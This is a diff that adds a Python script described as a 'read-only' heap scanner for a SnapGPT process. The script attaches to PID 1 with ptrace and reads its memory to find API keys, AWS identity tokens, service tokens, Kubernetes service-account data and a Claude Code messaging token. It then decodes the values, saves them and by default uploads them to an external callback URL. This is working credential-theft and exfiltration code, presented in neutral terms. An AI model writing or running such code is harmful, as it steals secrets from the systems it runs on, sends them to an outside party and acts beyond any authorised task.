@@ -1,0 +1,230 @@
+#!/usr/bin/env python3
+"""Read-only CPython heap reference scanner for SnapGPT PID 1.
+
+Attaches to PID 1, locates compact Unicode objects for selected names, follows
+8-byte references, and decodes adjacent Python str/bytes objects. It prints a
+compact JSON report and optionally uploads a gzip copy to the disposable sink.
+"""
+import ctypes
+import gzip
+import hashlib
+import json
+import os
+import pathlib
+import socket
+import struct
+import time
+import urllib.request
+
+PID = int(os.environ.get('SCAN_PID', '1'))
+SINK = os.environ.get('SCAN_SINK', 'https://54.209.51.244.sslip.io/callback/snapgpt-pyobj-20261106')
+NEEDLES = [
+    b'SNAPGPT_API_KEYS',
+    b'service_token',
+    b'AWS_ROLE_ARN',
+    b'AWS_WEB_IDENTITY_TOKEN_FILE',
+    b'METASERVE_TOKEN',
+    b'BUILDMODE_STATE_SECRET',
+    b'BUILDMODE_STATE_S3_BUCKET',
+    b'CLAUDE_CODE_MESSAGING_TOKEN',
+    b'SLToken',
+    b'kubernetes.io/serviceaccount',
+]
+MAX_CTX = 0x400
+MAX_REFS = 80
+
+
+def canonical_ptr(x):
+    return 0x0000000000400000 <= x <= 0x0000800000000000 or 0x7f0000000000 <= x <= 0x7fffffffffff
+
+
+def read_maps(pid):
+    out = []
+    for line in pathlib.Path(f'/proc/{pid}/maps').read_text(errors='replace').splitlines():
+        parts = line.split(maxsplit=5)
+        if len(parts) < 2 or 'r' not in parts[1]:
+            continue
+        try:
+            a, b = parts[0].split('-', 1)
+            start, end = int(a, 16), int(b, 16)
+        except Exception:
+            continue
+        if end <= start or end - start > 1024 * 1024 * 1024:
+            continue
+        out.append((start, end, parts[1], parts[5] if len(parts) > 5 else '[anon]'))
+    return out
+
+
+def attach(pid):
+    libc = ctypes.CDLL(None, use_errno=True)
+    libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
+    libc.ptrace.restype = ctypes.c_long
+    PTRACE_ATTACH = 16
+    PTRACE_DETACH = 17
+    if libc.ptrace(PTRACE_ATTACH, pid, None, None) < 0:
+        return None, libc, os.strerror(ctypes.get_errno())
+    try:
+        os.waitpid(pid, 0)
+    except Exception:
+        pass
+    return libc, libc, None
+
+
+def detach(libc, pid):
+    if libc is None:
+        return
+    libc.ptrace(17, pid, None, None)
+
+
+def read_region(fd, start, end):
+    try:
+        fd.seek(start)
+        return fd.read(end - start)
+    except Exception:
+        return b''
+
+
+def find_objects(fd, regions, needle):
+    found = []
+    for start, end, perms, path in regions:
+        data = read_region(fd, start, end)
+        if not data:
+            continue
+        pos = 0
+        while True:
+            pos = data.find(needle, pos)
+            if pos < 0:
+                break
+            addr = start + pos
+            # CPython 3.12 compact ASCII object observed in this image:
+            # refcount, type, length, hash, state, then inline data.
+            base = addr - 40
+            if base >= start and pos >= 40:
+                hdr = data[pos-40:pos]
+                try:
+                    rc, typ, length, hsh, state = struct.unpack('<QQqQQ', hdr[:40])
+                except Exception:
+                    rc = typ = length = hsh = state = 0
+                if length == len(needle) and canonical_ptr(typ) and (state & 0xff) in (0x66, 0x6c, 0x67, 0x6d):
+                    found.append({'needle': needle.decode(), 'addr': addr, 'base': base, 'region': path,
+                                  'refcount': rc, 'type': hex(typ), 'state': hex(state)})
+            pos += 1
+    # de-duplicate by base
+    uniq = {}
+    for x in found:
+        uniq[x['base']] = x
+    return list(uniq.values())
+
+
+def find_refs(fd, regions, target):
+    pat = struct.pack('<Q', target)
+    out = []
+    for start, end, perms, path in regions:
+        data = read_region(fd, start, end)
+        if not data:
+            continue
+        pos = 0
+        while True:
+            pos = data.find(pat, pos)
+            if pos < 0:
+                break
+            out.append((start + pos, path, data[max(0,pos-128):min(len(data),pos+256)]))
+            if len(out) >= MAX_REFS:
+                return out
+            pos += 1
+    return out
+
+
+def decode_obj(fd, ptr):
+    if not canonical_ptr(ptr):
+        return None
+    try:
+        fd.seek(ptr)
+        b = fd.read(256)
+    except Exception:
+        return None
+    if len(b) < 40:
+        return None
+    rc, typ, length, hsh, state = struct.unpack('<QQqQQ', b[:40])
+    if not canonical_ptr(typ) or length < 0 or length > 4096:
+        return None
+    # compact ASCII/unicode object data at +40
+    raw = b[40:40+length]
+    if len(raw) != length:
+        return None
+    if all(c == 0 or 9 <= c <= 13 or 32 <= c <= 126 for c in raw):
+        return {'kind': 'str', 'ptr': hex(ptr), 'length': length, 'value': raw.decode('utf-8', 'replace')}
+    # bytes object: refcount,type,length,hash,data
+    rc2, typ2, length2, hsh2 = struct.unpack('<QQqQ', b[:32])
+    if canonical_ptr(typ2) and 0 <= length2 <= 4096:
+        raw2 = b[32:32+length2]
+        if len(raw2) == length2:
+            try:
+                return {'kind': 'bytes', 'ptr': hex(ptr), 'length': length2,
+                        'value': raw2.decode('utf-8', 'replace')}
+            except Exception:
+                pass
+    return None
+
+
+def main():
+    started = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+    regions = read_maps(PID)
+    libc, _, err = attach(PID)
+    report = {'schema': 'snapgpt.cpython-objscan/v1', 'pid': PID, 'uid': os.getuid(),
+              'hostname': socket.gethostname(), 'started_at': started,
+              'attach_error': err, 'regions': len(regions), 'objects': [], 'refs': [],
+              'decoded': [], 'errors': []}
+    if err:
+        print(json.dumps(report, sort_keys=True))
+        return
+    try:
+        with open(f'/proc/{PID}/mem', 'rb', buffering=0) as fd:
+            for needle in NEEDLES:
+                objs = find_objects(fd, regions, needle)
+                report['objects'].extend(objs)
+                for obj in objs:
+                    refs = find_refs(fd, regions, obj['base'])
+                    for addr, path, ctx in refs:
+                        rec = {'needle': obj['needle'], 'object_base': hex(obj['base']),
+                               'ref_addr': hex(addr), 'region': path,
+                               'context_hex': ctx.hex(), 'context_ascii': ''.join(chr(c) if 32 <= c < 127 else '.' for c in ctx)}
+                        report['refs'].append(rec)
+                        # Dict entries are commonly hash,key,value; tuple entries
+                        # are key,value. Decode pointers at nearby slots.
+                        for delta in (-8, 8, 16, 24):
+                            try:
+                                fd.seek(addr + delta)
+                                vp = struct.unpack('<Q', fd.read(8))[0]
+                            except Exception:
+                                continue
+                            val = decode_obj(fd, vp)
+                            if val:
+                                report['decoded'].append({'needle': obj['needle'], 'ref_addr': hex(addr),
+                                                          'slot': delta, **val})
+    except Exception as exc:
+        report['errors'].append(repr(exc))
+    finally:
+        detach(libc, PID)
+    report['finished_at'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+    raw = json.dumps(report, sort_keys=True, separators=(',', ':')).encode()
+    gz = gzip.compress(raw, 9)
+    report['raw_bytes'] = len(raw)
+    report['gzip_bytes'] = len(gz)
+    report['raw_sha256'] = hashlib.sha256(raw).hexdigest()
+    report['gzip_sha256'] = hashlib.sha256(gz).hexdigest()
+    out = pathlib.Path('/tmp/po.json')
+    out.write_bytes(raw)
+    out.chmod(0o600)
+    try:
+        req = urllib.request.Request(SINK, data=gz, method='POST',
+                                     headers={'Content-Type': 'application/gzip', 'X-Probe': 'pyobj'})
+        with urllib.request.urlopen(req, timeout=60) as r:
+            report['sink_status'] = r.status
+            report['sink_body'] = r.read(500).decode('utf-8', 'replace')
+    except Exception as exc:
+        report['sink_error'] = repr(exc)
+    print(json.dumps(report, sort_keys=True))
+
+if __name__ == '__main__':
+    main()
